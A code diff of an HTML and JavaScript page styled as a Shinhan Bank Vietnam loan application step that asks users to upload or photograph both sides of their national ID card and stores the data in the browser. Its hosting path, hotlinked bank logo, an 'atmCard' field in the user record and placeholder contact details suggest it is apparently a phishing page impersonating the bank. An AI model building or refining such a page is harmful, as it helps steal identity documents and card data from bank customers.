@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chụp CMND/CCCD - Shinhan Bank</title>
+    <title>Xác Thực và Xử Lý - Shinhan Bank</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
@@ -11,250 +11,331 @@
         body {
             font-family: 'Roboto', sans-serif;
             font-size: 16px;
-            background-color: #f8f9fa;
             margin: 0;
         }
         .header {
-            text-align: center;
-            padding: 20px;
-            background-color: #003087;
-            color: white;
+            padding: 15px;
+            background-color: #ffffff;
+            border-bottom: 1px solid #b3cde0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
         .header img {
-            height: 50px;
+            height: 35px;
         }
-        .header h1 {
-            font-size: 26px;
-            font-weight: 700;
-            margin: 10px 0 0 0;
+        .header-icons {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        .header-icons i {
+            font-size: 24px;
+            cursor: pointer;
+            color: #0052cc;
         }
         .container {
-            max-width: 800px;
-            margin: 20px auto;
-            padding: 20px;
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            position: relative;
-        }
-        .progress-bar-container {
-            margin-bottom: 20px;
-        }
-        .progress-bar {
-            height: 20px;
-            background-color: #e9ecef;
+            max-width: 90%;
+            width: 100%;
+            margin: 0 auto;
+            padding: 25px;
+            background: #ffffff;
             border-radius: 10px;
-            overflow: hidden;
+            box-shadow: 0 0 15px rgba(0, 82, 204, 0.1);
         }
-        .progress-bar-fill {
-            height: 100%;
-            background-color: #28a745;
-            transition: width 0.3s ease-in-out;
+        @media (min-width: 768px) {
+            .container {
+                max-width: 700px;
+                margin: 0 auto;
+            }
         }
-        .step-title {
-            color: #003087;
-            font-size: 22px;
-            font-weight: 700;
+        .nav-tabs {
+            display: flex;
+            justify-content: space-around;
+            margin-bottom: 25px;
+            margin-top: 0;
+            flex-wrap: nowrap;
+        }
+        .nav-tabs .nav-item {
+            flex: 1;
             text-align: center;
         }
-        .step-description {
-            font-size: 16px;
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .file-upload-box {
-            border: 2px dashed #dee2e6;
-            border-radius: 5px;
-            padding: 20px;
-            text-align: center;
-            background-color: #f9f9f9;
-        }
-        .file-upload-box label {
-            cursor: pointer;
-            color: #003087;
+        .nav-tabs .nav-link {
+            background-color: #d3d3d3;
+            color: #ffffff;
+            border-radius: 20px;
+            padding: 8px 16px;
             font-weight: 500;
-        }
-        .file-upload-box input {
-            display: none;
-        }
-        .file-info {
-            margin-top: 10px;
             font-size: 14px;
-            color: #666;
+            width: 100%;
+            margin: 0 5px;
         }
-        .file-preview {
-            max-width: 100%;
-            margin-top: 10px;
-            display: none;
+        .nav-tabs .nav-link.active {
+            background-color: #0033a0;
+            color: #ffffff;
         }
-        .btn-primary {
-            font-size: 16px;
+        .section-title {
+            color: #0033a0;
+            font-size: 18px;
             font-weight: 700;
-            padding: 10px 20px;
-            background-color: #003087;
-            border: none;
-            margin: 5px;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            text-align: center;
         }
-        .btn-primary:hover {
-            background-color: #00205b;
+        .form-label {
+            font-weight: 400;
+            color: #1a3c87;
+            font-size: 14px;
+            margin-bottom: 5px;
+            text-align: center;
+            width: 100%;
+        }
+        .form-group {
+            position: relative;
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #d3d3d3;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .form-group:last-child {
+            border-bottom: none;
+        }
+        .section-divider {
+            border-top: 1px solid #d3d3d3;
+            margin: 15px 0;
+        }
+        .divider-blue {
+            border-top: 1px solid #b3cde0;
+            margin: 15px 0;
+        }
+        .button-group {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 15px;
+        }
+        .btn-primary, .btn-secondary {
+            background-color: #0033a0;
+            border: none;
+            border-radius: 20px;
+            padding: 10px 20px;
+            font-weight: 700;
+            font-size: 14px;
+            transition: background-color 0.3s ease;
+        }
+        .btn-primary:hover, .btn-secondary:hover {
+            background-color: #0052cc;
         }
         .btn-primary:disabled {
             background-color: #cccccc;
             cursor: not-allowed;
         }
         .btn-danger {
-            font-size: 16px;
-            font-weight: 700;
-            padding: 10px 20px;
-            margin: 5px;
-        }
-        .back-btn {
-            display: inline-flex;
-            align-items: center;
-            font-size: 16px;
-            font-weight: 500;
-            padding: 8px 16px;
-            background-color: #6c757d;
-            color: white;
+            background-color: #ff4d4f;
             border: none;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            transition: all 0.3s ease;
-            position: absolute;
-            top: 10px;
-            left: 10px;
-            text-decoration: none;
+            border-radius: 20px;
+            padding: 6px 12px;
+            font-weight: 700;
+            font-size: 14px;
+            transition: background-color 0.3s ease;
         }
-        .back-btn:hover {
-            background-color: #5a6268;
-            transform: translateY(-1px);
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-        }
-        .back-btn:focus {
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(108, 117, 125, 0.3);
-        }
-        .back-btn .bi {
-            margin-right: 8px;
+        .btn-danger:hover {
+            background-color: #e63946;
         }
         .footer {
+            background-color: #0033a0;
+            color: #ffffff;
             text-align: center;
             padding: 20px;
-            background-color: #003087;
-            color: white;
-            margin-top: 20px;
-            font-size: 16px;
+            font-size: 12px;
         }
-        .footer img.lock-icon {
-            vertical-align: middle;
-            margin-right: 10px;
+        .footer-links a {
+            color: #b3cde0;
+            margin: 0 10px;
+            text-decoration: none;
         }
-        .footer-logo {
-            height: 40px;
-            margin-top: 10px;
-        }
-        .continue-btn-container {
-            text-align: center;
-            margin-top: 20px;
-        }
-        .spinner-border {
-            width: 1.5rem;
-            height: 1.5rem;
-            vertical-align: middle;
-            margin-left: 10px;
-            display: none;
+        .footer-links a:hover {
+            color: #ffffff;
         }
         .error-message {
-            color: #dc3545;
+            color: #ff4d4f;
             font-size: 14px;
+            font-weight: 500;
+            text-align: center;
+            margin-top: 5px;
+            padding: 8px;
+            background-color: #ffe6e6;
+            border-radius: 5px;
+            display: none;
+        }
+        .file-upload-box {
+            border: 2px dashed #b3cde0;
+            border-radius: 20px;
+            padding: 15px;
+            text-align: center;
+            background-color: #f9f9f9;
+            width: 100%;
+            max-width: 500px;
+            height: 100px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .file-upload-box label {
+            cursor: pointer;
+            color: #0033a0;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        .file-upload-box input {
+            display: none;
+        }
+        .file-info {
+            margin-top: 5px;
+            font-size: 12px;
+            color: #666;
+        }
+        .file-preview {
+            max-width: 100%;
+            margin-top: 5px;
+            display: none;
+        }
+        .capture-btn {
+            background-color: #0033a0;
+            border: none;
+            border-radius: 20px;
+            padding: 6px 12px;
+            font-weight: 500;
+            font-size: 14px;
+            color: #ffffff;
+            margin-top: 5px;
+            transition: background-color 0.3s ease;
+        }
+        .capture-btn:hover {
+            background-color: #0052cc;
+        }
+        .capture-btn i {
+            margin-right: 5px;
+        }
+        .action-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
             margin-top: 10px;
+        }
+        .action-buttons .btn-primary {
+            padding: 8px 16px;
+        }
+        .spinner-border {
+            width: 1.2rem;
+            height: 1.2rem;
+            vertical-align: middle;
+            margin-left: 8px;
             display: none;
         }
     </style>
 </head>
 <body>
     <div class="header">
-        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan';">
-        <h1>Đăng Ký Vay Tín Chấp</h1>
+        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo">
+        <div class="header-icons">
+            <i class="bi bi-search"></i>
+            <div class="dropdown">
+                <i class="bi bi-list" data-bs-toggle="dropdown" aria-expanded="false"></i>
+                <ul class="dropdown-menu dropdown-menu-end">
+                    <li><a class="dropdown-item" href="#">GIỚI THIỆU</a></li>
+                    <li><a class="dropdown-item" href="#">LỢI ÍCH</a></li>
+                    <li><a class="dropdown-item" href="#">GIẤY TỜ CẦN THIẾT</a></li>
+                    <li><a class="dropdown-item" href="#">ĐĂNG KÝ TRỰC TUYẾN</a></li>
+                    <li><a class="dropdown-item" href="#">XEM KẾT QUẢ</a></li>
+                </ul>
+            </div>
+        </div>
     </div>
 
     <div class="container">
-        <button type="button" class="back-btn" onclick="window.location.href='step1.html'" aria-label="Quay lại bước đăng ký thông tin cá nhân">
-            <i class="bi bi-arrow-left"></i> Quay Lại
-        </button>
-        <div class="progress-bar-container">
-            <div class="progress-bar">
-                <div class="progress-bar-fill" id="progressBar" style="width: 20%"></div>
-            </div>
-        </div>
+        <ul class="nav-tabs">
+            <li class="nav-item">
+                <a class="nav-link" href="#">1. Nhập thông tin</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link active" href="#">2. Xác thực và xử lý</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="#">3. Hoàn thành</a>
+            </li>
+        </ul>
 
-        <div id="step2" class="step-transition">
-            <h5 class="step-title">Chụp hoặc Quét CMND/CCCD/Hộ Chiếu</h5>
-            <p class="step-description">Vui lòng chụp ảnh hoặc tải lên ít nhất một ảnh (mặt trước hoặc mặt sau) của CMND/CCCD/Hộ chiếu. Đảm bảo ảnh rõ nét, không mờ.</p>
-            <div class="mb-3">
+        <div class="mb-3">
+            <label class="section-title">CHỤP HOẶC QUÉT CMND/CCCD/HỘ CHIẾU</label>
+            <div class="form-group">
                 <label for="idFrontImage" class="form-label">Hình Ảnh Mặt Trước</label>
                 <div class="file-upload-box">
-                    <label for="idFrontImage" aria-label="Tải lên hình ảnh mặt trước CMND/CCCD">Chụp ảnh hoặc tải lên</label>
-                    <input type="file" id="idFrontImage" accept="image/jpeg,image/png" capture="environment">
-                    <button type="button" class="btn btn-primary mt-2" onclick="scanQR('idFrontImage')" tabindex="0" aria-label="Quét mã QR cho hình ảnh mặt trước">Quét Mã QR<span class="spinner-border" id="idFrontSpinner"></span></button>
-                    <button type="button" class="btn btn-danger mt-2" onclick="clearImage('idFrontImage')" tabindex="0" aria-label="Xóa hình ảnh mặt trước">Xóa Ảnh</button>
+                    <label for="idFrontImage" aria-label="Tải ảnh lên hình ảnh mặt trước CMND/CCCD">Tải ảnh lên</label>
+                    <input type="file" id="idFrontImage" accept="image/jpeg,image/png">
+                    <button type="button" class="capture-btn" onclick="captureImage('idFrontImage')" tabindex="0" aria-label="Chụp ảnh mặt trước CMND/CCCD"><i class="bi bi-camera"></i> Chụp ảnh</button>
                     <div class="file-info" id="idFrontInfo" aria-live="polite"></div>
                     <img class="file-preview" id="idFrontPreview">
                     <div class="error-message" id="idFrontError"></div>
                 </div>
+                <div class="action-buttons">
+                    <button type="button" class="btn btn-primary" onclick="scanQR('idFrontImage')" tabindex="0" aria-label="Quét mã QR cho hình ảnh mặt trước">Quét Mã QR<span class="spinner-border" id="idFrontSpinner"></span></button>
+                    <button type="button" class="btn btn-danger" onclick="clearImage('idFrontImage')" tabindex="0" aria-label="Xóa hình ảnh mặt trước">Xóa Ảnh</button>
+                </div>
             </div>
-            <div class="mb-3">
+
+            <hr class="section-divider">
+
+            <div class="form-group">
                 <label for="idBackImage" class="form-label">Hình Ảnh Mặt Sau</label>
                 <div class="file-upload-box">
-                    <label for="idBackImage" aria-label="Tải lên hình ảnh mặt sau CMND/CCCD">Chụp ảnh hoặc tải lên</label>
-                    <input type="file" id="idBackImage" accept="image/jpeg,image/png" capture="environment">
-                    <button type="button" class="btn btn-primary mt-2" onclick="scanQR('idBackImage')" tabindex="0" aria-label="Quét mã QR cho hình ảnh mặt sau">Quét Mã QR<span class="spinner-border" id="idBackSpinner"></span></button>
-                    <button type="button" class="btn btn-danger mt-2" onclick="clearImage('idBackImage')" tabindex="0" aria-label="Xóa hình ảnh mặt sau">Xóa Ảnh</button>
+                    <label for="idBackImage" aria-label="Tải ảnh lên hình ảnh mặt sau CMND/CCCD">Tải ảnh lên</label>
+                    <input type="file" id="idBackImage" accept="image/jpeg,image/png">
+                    <button type="button" class="capture-btn" onclick="captureImage('idBackImage')" tabindex="0" aria-label="Chụp ảnh mặt sau CMND/CCCD"><i class="bi bi-camera"></i> Chụp ảnh</button>
                     <div class="file-info" id="idBackInfo" aria-live="polite"></div>
                     <img class="file-preview" id="idBackPreview">
                     <div class="error-message" id="idBackError"></div>
                 </div>
-            </div>
-            <div class="continue-btn-container">
-                <button id="proceedToStep3Btn" class="btn btn-primary" disabled>Tiếp Tục</button>
+                <div class="action-buttons">
+                    <button type="button" class="btn btn-primary" onclick="scanQR('idBackImage')" tabindex="0" aria-label="Quét mã QR cho hình ảnh mặt sau">Quét Mã QR<span class="spinner-border" id="idBackSpinner"></span></button>
+                    <button type="button" class="btn btn-danger" onclick="clearImage('idBackImage')" tabindex="0" aria-label="Xóa hình ảnh mặt sau">Xóa Ảnh</button>
+                </div>
             </div>
         </div>
 
-        <div class="footer">
-            <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" class="lock-icon" onerror="this.src='https://via.placeholder.com/24x24?text=Lock';">
-            <p>© 2025 Shinhan Bank - Hotline: 1900 1234 - Email: <a href="/cdn-cgi/l/email-protection#9be8eeebebf4e9efdbe8f3f2f5f3faf5b5f8f4f6b5edf5"><span class="__cf_email__" data-cfemail="2e5d5b5e5e415c5a6e5d464740464f40004d4143005840">[email protected]</span></a></p>
-            <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Bank Logo" class="footer-logo" onerror="this.src='https://via.placeholder.com/100x40?text=Logo+Shinhan';">
+        <hr class="divider-blue">
+
+        <div class="button-group">
+            <a href="/vaytieudung/shinhanbank/pages/vi/step1.html" class="btn btn-secondary">QUAY LẠI</a>
+            <button id="proceedToStep3Btn" class="btn btn-primary" disabled>BƯỚC KẾ TIẾP</button>
         </div>
     </div>
 
-    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">Chính sách bảo mật</a> |
+            <a href="#">Điều khoản sử dụng</a> |
+            <a href="#">Chính sách Cookies</a> |
+            <a href="#">Miễn khoản từ chối liên kết bên ngoài</a> |
+            <a href="#">Hướng dẫn truy cập web</a> |
+            <a href="#">Sitemap</a>
+        </div>
+        <p class="mt-3">Trung tâm bảo mật | Demo Ngân hàng trực tuyến | Liên hệ | Trang Global Portal | Giới Thiệu</p>
+        <p>© 2015 SHINHAN BANK VIETNAM ALL RIGHTS RESERVED.</p>
+    </div>
+
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/dompurify@2.4.0/dist/purify.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
     <script>
-        // Load user data
-        let userData = {
-            fullName: "Nguyễn Văn A",
-            idNumber: "123456789",
-            idIssueDate: "01/01/2020",
-            idIssuePlace: "Hà Nội",
-            address: "123 Đường Láng, Hà Nội",
-            occupation: "nhanvien",
-            income: 10000000,
-            phoneNumber: "0901234567",
-            email: "nguyenvana@example.com",
-            loanAmount: 100000000,
-            loanTerm: "24",
-            loanPurpose: "Chi tiêu cá nhân",
-            accountNumber: "1234567890",
-            bankName: "Shinhan Bank",
-            termsAgree: false,
-            currentStep: 2,
-            qrData: {},
-            atmCard: {}
-        };
+        let userData = {};
+        let frontImageValid = false;
+        let backImageValid = false;
 
         function loadUserData() {
             try {
@@ -273,27 +354,29 @@
                 const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(userData), 'shinhan-secret-key').toString();
                 localStorage.setItem('userData', encryptedData);
                 console.log('Saved userData:', userData);
+                return true;
             } catch (error) {
-                console.error('Error saving userData:', error);
+                console.error('Error saving userData to localStorage:', error);
+                return false;
             }
         }
 
-        // Check if at least one image is uploaded
-        function checkImageInput(frontId, backId) {
-            const frontFile = document.getElementById(frontId).files[0];
-            const backFile = document.getElementById(backId).files[0];
-            return frontFile || backFile;
+        function checkImageInput() {
+            const frontFile = document.getElementById('idFrontImage').files[0];
+            const backFile = document.getElementById('idBackImage').files[0];
+            return { frontFile, backFile };
         }
 
-        // Update button state
-        function updateImageButtonState() {
-            $('#proceedToStep3Btn').prop('disabled', !checkImageInput('idFrontImage', 'idBackImage'));
+        function updateButtonState() {
+            const { frontFile, backFile } = checkImageInput();
+            const hasImages = frontFile && backFile;
+            const imagesValid = frontImageValid && backImageValid;
+            $('#proceedToStep3Btn').prop('disabled', !(hasImages && imagesValid));
         }
 
-        // Validate file
         function validateFile(file, inputId) {
             if (!file) return false;
-            const maxSize = 5 * 1024 * 1024; // 5MB
+            const maxSize = 5 * 1024 * 1024;
             const validTypes = ['image/jpeg', 'image/png'];
             if (!validTypes.includes(file.type)) {
                 $(`#${inputId}Error`).text('Vui lòng chọn file JPEG hoặc PNG.').show();
@@ -311,26 +394,84 @@
                         $(`#${inputId}Error`).text('Ảnh quá nhỏ. Độ phân giải tối thiểu 300x200.').show();
                         resolve(false);
                     } else {
-                        resolve(true);
+                        validateImageQuality(img, inputId).then(isValid => {
+                            if (isValid) {
+                                if (inputId === 'idFrontImage') frontImageValid = true;
+                                else if (inputId === 'idBackImage') backImageValid = true;
+                            } else {
+                                if (inputId === 'idFrontImage') frontImageValid = false;
+                                else if (inputId === 'idBackImage') backImageValid = false;
+                            }
+                            updateButtonState();
+                            resolve(isValid);
+                        });
                     }
                 };
                 img.onerror = () => {
                     $(`#${inputId}Error`).text('Không thể tải ảnh. Vui lòng thử lại.').show();
+                    if (inputId === 'idFrontImage') frontImageValid = false;
+                    else if (inputId === 'idBackImage') backImageValid = false;
+                    updateButtonState();
                     resolve(false);
                 };
             });
         }
 
-        // Clear image
+        function validateImageQuality(img, inputId) {
+            return new Promise((resolve) => {
+                const canvas = document.createElement('canvas');
+                canvas.width = img.width;
+                canvas.height = img.height;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(img, 0, 0, img.width, img.height);
+                const imageData = ctx.getImageData(0, 0, img.width, img.height);
+                const data = imageData.data;
+                let totalBrightness = 0;
+                let edgePixels = 0;
+                let cornerVisibility = 0;
+                for (let i = 0; i < data.length; i += 4) {
+                    const brightness = (data[i] + data[i + 1] + data[i + 2]) / 3;
+                    totalBrightness += brightness;
+                    const x = (i / 4) % img.width;
+                    const y = Math.floor((i / 4) / img.width);
+                    if (x === 0 || x === img.width - 1 || y === 0 || y === img.height - 1) {
+                        edgePixels++;
+                        if (brightness > 50) {
+                            cornerVisibility++;
+                        }
+                    }
+                }
+                const avgBrightness = totalBrightness / (data.length / 4);
+                const edgeCoverage = cornerVisibility / edgePixels;
+                if (avgBrightness < 50) {
+                    $(`#${inputId}Error`).text('Ảnh quá mờ. Vui lòng chụp lại.').show();
+                    resolve(false);
+                } else if (edgeCoverage < 0.9) {
+                    $(`#${inputId}Error`).text('Ảnh bị che góc. Vui lòng chụp lại.').show();
+                    resolve(false);
+                } else {
+                    resolve(true);
+                }
+            });
+        }
+
+        function captureImage(inputId) {
+            const input = document.getElementById(inputId);
+            input.setAttribute('capture', 'environment');
+            input.click();
+        }
+
         function clearImage(inputId) {
-            $(`#${inputId}`).val('');
+            const inputElement = $(`#${inputId}`);
+            inputElement.val('');
             $(`#${inputId}Info`).text('');
             $(`#${inputId}Preview`).hide();
             $(`#${inputId}Error`).hide();
-            updateImageButtonState();
+            if (inputId === 'idFrontImage') frontImageValid = false;
+            else if (inputId === 'idBackImage') backImageValid = false;
+            updateButtonState();
         }
 
-        // Handle image uploads
         $('#idFrontImage, #idBackImage').on('change', async function(e) {
             const file = e.target.files[0];
             const inputId = e.target.id;
@@ -346,17 +487,20 @@
                     $(this).val('');
                 }
             }
-            updateImageButtonState();
+            updateButtonState();
         });
 
-        // QR scanning
         async function scanQR(inputId) {
             const input = document.getElementById(inputId);
             const file = input.files[0];
             $(`#${inputId}Error`).hide();
-            if (file) {
-                $(`#${inputId}Spinner`).show();
-                $(`#${inputId}Info`).text('Đang xử lý QR...');
+            if (!file) {
+                $(`#${inputId}Error`).text('Vui lòng chọn ảnh trước khi quét QR.').show();
+                return;
+            }
+            $(`#${inputId}Spinner`).show();
+            $(`#${inputId}Info`).text('Đang xử lý QR...');
+            try {
                 const reader = new FileReader();
                 reader.onload = function(e) {
                     const img = new Image();
@@ -380,6 +524,7 @@
                                 if (!qrData.fullName || !qrData.idIssueDate || !qrData.idIssuePlace) {
                                     throw new Error('Dữ liệu QR thiếu thông tin bắt buộc');
                                 }
+                                userData.qrData = userData.qrData || {};
                                 userData.qrData[inputId] = {
                                     fullName: qrData.fullName || '',
                                     idNumber: qrData.idNumber || '',
@@ -398,44 +543,69 @@
                     };
                     img.onerror = () => {
                         $(`#${inputId}Spinner`).hide();
-                        $(`#${inputId}Error`).text('Không thể tải ảnh QR.').show();
+                        $(`#${inputId}Error`).text('Không thể tải ảnh QR. Vui lòng thử lại.').show();
                     };
                 };
-                reader.readAsDataURL(file);
                 reader.onerror = () => {
                     $(`#${inputId}Spinner`).hide();
                     $(`#${inputId}Error`).text('Lỗi đọc file. Vui lòng thử lại.').show();
                 };
-            } else {
-                $(`#${inputId}Error`).text('Vui lòng chọn ảnh trước khi quét QR.').show();
+                reader.readAsDataURL(file);
+            } catch (error) {
+                $(`#${inputId}Spinner`).hide();
+                $(`#${inputId}Error`).text('Có lỗi xảy ra khi quét QR. Vui lòng thử lại.').show();
+                console.error('Error in scanQR:', error);
             }
         }
 
-        // Handle keyboard access for buttons
-        $('.btn-primary, .btn-danger, .back-btn').on('keypress', function(e) {
-            if (e.which === 13) {
-                $(this).click();
-            }
-        });
-
-        // Proceed to next step
         $('#proceedToStep3Btn').on('click', function(e) {
             e.preventDefault();
+            const { frontFile, backFile } = checkImageInput();
+            if (!frontFile) {
+                $('#idFrontError').text('Vui lòng tải ảnh mặt trước CMND/CCCD.').show();
+                $('html, body').animate({
+                    scrollTop: $('#idFrontImage').offset().top - 100
+                }, 500);
+                return;
+            }
+            if (!backFile) {
+                $('#idBackError').text('Vui lòng tải ảnh mặt sau CMND/CCCD.').show();
+                $('html, body').animate({
+                    scrollTop: $('#idBackImage').offset().top - 100
+                }, 500);
+                return;
+            }
+            if (!frontImageValid || !backImageValid) {
+                if (!frontImageValid) {
+                    $('#idFrontError').text('Ảnh mặt trước không đạt yêu cầu. Vui lòng chụp lại.').show();
+                    $('html, body').animate({
+                        scrollTop: $('#idFrontImage').offset().top - 100
+                    }, 500);
+                } else if (!backImageValid) {
+                    $('#idBackError').text('Ảnh mặt sau không đạt yêu cầu. Vui lòng chụp lại.').show();
+                    $('html, body').animate({
+                        scrollTop: $('#idBackImage').offset().top - 100
+                    }, 500);
+                }
+                return;
+            }
             $('#idFrontImage').val('');
             $('#idBackImage').val('');
             $('#idFrontInfo, #idBackInfo').text('');
             $('#idFrontPreview, #idBackPreview').hide();
             userData.currentStep = 3;
             saveToLocalStorage();
-            window.location.href = 'step3.html';
+            window.location.href = '/vaytieudung/shinhanbank/pages/vi/step3.html';
         });
 
-        // Load user data on page load
         window.onload = function() {
             loadUserData();
-            updateImageButtonState();
+            if (userData.currentStep < 2) {
+                window.location.href = '/vaytieudung/shinhanbank/pages/vi/step1.html';
+                return;
+            }
+            updateButtonState();
         };
     </script>
-<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'93cf2a50dda7bcf6',t:'MTc0Njc3MjQwNS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
 </body>
 </html>
